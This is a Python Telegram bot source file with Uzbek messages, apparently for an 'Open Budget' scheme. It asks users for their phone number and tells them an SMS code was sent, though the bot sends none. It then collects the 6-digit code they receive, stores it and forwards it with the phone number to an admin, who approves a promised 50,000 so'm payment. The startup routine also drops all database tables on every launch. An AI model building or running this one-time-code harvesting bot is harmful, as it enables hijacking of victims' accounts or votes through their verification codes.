import asyncio
import asyncpg
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 8080))  # Render.com uchun port

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("📊 Statistika")],
        [KeyboardButton("📨 Barchaga xabar")],
        [KeyboardButton("📋 Kutayotgan kodlar")]
    ],
    resize_keyboard=True
)

# ================= DATABASE =================
async def get_db():
    try:
        return await asyncpg.connect(DATABASE_URL)
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    """Database jadvallarini yaratish yoki yangilash"""
    try:
        conn = await get_db()
        
        # Eski jadvallarni tekshirish va o'chirish
        await conn.execute("DROP TABLE IF EXISTS transactions CASCADE")
        await conn.execute("DROP TABLE IF EXISTS codes CASCADE")
        await conn.execute("DROP TABLE IF EXISTS users CASCADE")
        logger.info("✅ Eski jadvallar o'chirildi")
        
        # users jadvalini yaratish
        await conn.execute("""
            CREATE TABLE users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        logger.info("✅ users jadvali yaratildi")
        
        # codes jadvalini yaratish
        await conn.execute("""
            CREATE TABLE codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        logger.info("✅ codes jadvali yaratildi")
        
        # transactions jadvalini yaratish
        await conn.execute("""
            CREATE TABLE transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        logger.info("✅ transactions jadvali yaratildi")
        
        await conn.close()
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database xatosi: {e}")
        raise

# ================= 1. START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 Xush kelibsiz, Admin!",
            reply_markup=admin_menu
        )
        return
    
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        "📱 Iltimos, telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard
    )

# ================= 2. TELEFON RAQAM =================
@dp.message_handler(content_types=['contact'])
async def receive_phone(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start buyrug'ini bosing!")
        return
    
    phone = message.contact.phone_number
    logger.info(f"📞 Telefon: {telegram_id} -> {phone}")
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    # Bazaga saqlash
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
        await conn.close()
        logger.info(f"✅ Foydalanuvchi saqlandi: {telegram_id}")
    except Exception as e:
        logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
    
    await message.answer(
        f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
        f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:"
    )

# ================= 3. KODNI QABUL QILISH =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    logger.info(f"🔑 Kod kiritildi: {telegram_id} -> {code}")
    
    if not phone:
        await message.answer("❌ Xatolik yuz berdi! /start buyrug'ini bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ Iltimos, 6 xonali raqamli kod kiriting:")
        return
    
    # Kodni bazaga saqlash
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
        await conn.close()
        logger.info(f"✅ Kod bazaga saqlandi: {telegram_id} -> {code}")
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    
    await message.answer(
        "⏳ Kodingiz qabul qilindi!\n"
        "Admin tekshirib, tasdiqlaydi..."
    )
    
    # ADMIN'GA KODNI YUBORISH
    try:
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("✅ To'g'ri kod (+50 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
            InlineKeyboardButton("❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"🆔 Foydalanuvchi ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kiritilgan kod: <code>{code}</code>\n\n"
            f"⏳ Iltimos, bu kodni tekshiring va tasdiqlang!",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        logger.info(f"✅ Admin'ga kod tekshirish uchun yuborildi")
    except Exception as e:
        logger.error(f"❌ Admin'ga kod yuborishda XATOLIK: {e}")
    
    user_states[telegram_id] = "done"

# ================= 4. ADMIN TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    logger.info(f"📋 Admin harakati: {action}")
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        try:
            conn = await get_db()
            result = await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                    telegram_id
                )
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount) VALUES ($1, 50000)",
                    telegram_id
                )
                await conn.close()
                
                try:
                    await bot.send_message(
                        telegram_id,
                        "✅ TABRIKLAYMIZ! 🎉\n\n"
                        "Sizning kodingiz tasdiqlandi!\n"
                        "💰 Hisobingizga +50 000 so'm qo'shildi!\n\n"
                        "Balansni tekshirish: /balance"
                    )
                    logger.info(f"✅ Foydalanuvchiga tasdiqlash xabari yuborildi: {telegram_id}")
                except Exception as e:
                    logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                
                await callback.message.edit_text(
                    f"✅ <b>TASDIQLANDI!</b>\n\n"
                    f"🆔 ID: {telegram_id}\n"
                    f"📞 Tel: {phone}\n"
                    f"🔑 Kod: {code}\n"
                    f"💰 +50 000 so'm qo'shildi",
                    parse_mode="HTML"
                )
                await callback.answer("✅ Kod tasdiqlandi!")
                logger.info(f"✅ Kod tasdiqlandi: {telegram_id}")
            else:
                await callback.answer("❌ Kod allaqachon qayta ishlangan!")
                logger.warning(f"⚠️ Kod allaqachon qayta ishlangan: {code}")
                
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik yuz berdi!")
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'rejected' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            await conn.close()
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kechirasiz, siz kiritgan kod noto'g'ri!\n\n"
                    "Iltimos, telefon raqamingizni qaytadan yuboring: /start"
                )
                logger.info(f"❌ Foydalanuvchiga rad etish xabari yuborildi: {telegram_id}")
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"🆔 ID: {telegram_id}\n"
                f"Kod noto'g'ri deb topildi",
                parse_mode="HTML"
            )
            await callback.answer("❌ Kod rad etildi!")
            logger.info(f"❌ Kod rad etildi: {telegram_id}")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik yuz berdi!")

# ================= 5. ADMIN STATISTIKA =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    try:
        conn = await get_db()
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        rejected = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'rejected'")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        await conn.close()
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Foydalanuvchilar: {users_count}\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"⏳ Kutayotgan: {pending}\n"
            f"✅ Tasdiqlangan: {verified}\n"
            f"❌ Rad etilgan: {rejected}",
            parse_mode="HTML"
        )
        logger.info("📊 Statistika ko'rsatildi")
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
        await message.answer("❌ Statistika olishda xatolik!")

# ================= 6. KUTAYOTGAN KODLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        await conn.close()
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"🆔 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
        logger.info("📋 Kutayotgan kodlar ko'rsatildi")
    except Exception as e:
        logger.error(f"❌ Kodlar ro'yxatida xatolik: {e}")
        await message.answer("❌ Kodlar ro'yxatini olishda xatolik!")

# ================= 7. BARCHAGA XABAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:\n(Bekor qilish uchun /cancel bosing)")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    if message.text == "/cancel":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)
        return
    
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users")
        await conn.close()
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        sent = 0
        failed = 0
        
        await message.answer(f"⏳ Xabar {len(users)} ta foydalanuvchiga yuborilmoqda...")
        
        for user in users:
            try:
                await bot.send_message(
                    user['telegram_id'],
                    f"📨 <b>XABAR</b>\n\n{text}",
                    parse_mode="HTML"
                )
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                failed += 1
                logger.error(f"❌ Xabar yuborilmadi {user['telegram_id']}: {e}")
        
        await message.answer(
            f"✅ Xabar yuborildi!\n"
            f"✅ Yuborildi: {sent}\n"
            f"❌ Yuborilmadi: {failed}",
            reply_markup=admin_menu
        )
        logger.info(f"📨 Broadcast yakunlandi: {sent} ta yuborildi, {failed} ta yuborilmadi")
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
        await message.answer("❌ Xabar yuborishda xatolik!")

# ================= 8. BALANS =================
@dp.message_handler(commands=['balance'])
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        await conn.close()
        
        if user:
            await message.answer(f"💰 Balans: {user['balance']:,} so'm")
        else:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
        await message.answer("❌ Balansni olishda xatolik!")

# ================= WEB SERVER (Render.com uchun) =================
async def handle_health(request):
    """Health check endpoint"""
    return web.Response(text="Bot is running!")

async def handle_root(request):
    """Root endpoint"""
    return web.Response(text="Open Budget Bot - Web Service")

async def start_web_server():
    """Web serverni ishga tushirish"""
    app = web.Application()
    app.router.add_get('/', handle_root)
    app.router.add_get('/health', handle_health)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"✅ Web server {PORT} portda ishga tushdi")

# ================= MAIN =================
async def on_startup(dp):
    logger.info("🤖 Bot ishga tushmoqda...")
    logger.info(f"🔑 Bot token: {BOT_TOKEN[:10]}...")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info(f"🌐 Web server port: {PORT}")
    await init_db()
    logger.info("✅ Bot tayyor!")

async def main():
    # Web serverni ishga tushirish
    await start_web_server()
    
    # Botni ishga tushirish
    await executor.start_polling(dp, on_startup=on_startup, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
